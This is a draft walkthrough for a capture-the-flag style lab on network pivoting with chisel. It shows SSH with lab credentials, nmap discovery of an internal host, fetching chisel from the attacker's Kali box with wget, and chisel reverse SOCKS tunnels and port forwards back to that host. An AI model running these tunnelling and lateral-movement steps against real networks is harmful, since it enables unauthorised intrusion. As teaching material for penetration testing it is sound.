# Walkthrough - chisel

# Recommendations

Use a multi-plex terminal; tmux, terminator or whatever you find works for you! 

Save the info from the output of the build script. 

# Flags:

1. ssh onto box 1
2. ssh onto box 2
3. local webserver on box 1
4. ssh onto box 3
5. local webserver on box 3

# Flag 1

1. Build the lab
2. Read the readme!

SSH into the box with a password of `danny`

```bash
ssh danny@192.168.69.2
```

read the flag.txt file

# Flag 2

Complete flag 1

1. Find internal box from public_box

```bash
ip a
eth0@if321: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:0a:10:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.16.2/24 brd 10.10.16.255 scope global eth0
       valid_lft forever preferred_lft forever

nmap -sn 10.10.16.0/24
Nmap scan report for internal_box.internal (10.10.16.3)

nmap -p 22 10.10.16.3

Starting Nmap 7.60 ( https://nmap.org ) at 2023-08-11 15:30 UTC
Nmap scan report for internal_box.internal (10.10.16.3)
Host is up (0.00015s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```

1. Upload chisel to box (check above)
2. start chisel server on kali

```bash
./chisel server --reverse --port 8000 --socks5
```

1. Connect from public_box

```bash
danny@3e2de45ffaca:~$ ./chisel client 172.17.0.1:8000 R:1080:socks
```

1. ssh into the machine with the credentials provided before (`ariana:Password1`)

```bash
proxychains ssh ariana@10.10.16.3
```

1. Read the flag.

# Flag 3

(you are told about local webserver on port 8080)

1. Check to see if server is running.

```bash
netstat -t
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:8080          localhost:38768         TIME_WAIT  
tcp        0    164 3e2de45ffaca:22         192.168.69.1:33964      ESTABLISHED
```

(told to use a reverse port forward.

1. Upload chisel to the box (Do I assume people know how to do that?)

Start web server on kali:

```bash
python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Download to the public_box:

```bash
danny@3e2de45ffaca:~$ wget http://172.17.0.1:9001/chisel
```

1. Start chisel server on kali (This will be taught)

```bash
./chisel server --reverse --port 8000
```

1. Connect from public_box

```bash
./chisel client 172.17.0.1:8000 R:127.0.0.1:8081:8080
```

1. get flag

```bash
curl http://127.0.0.1:8081
```

# Flags 4 and 5

Solutions wont be released till next lab but feel free to try.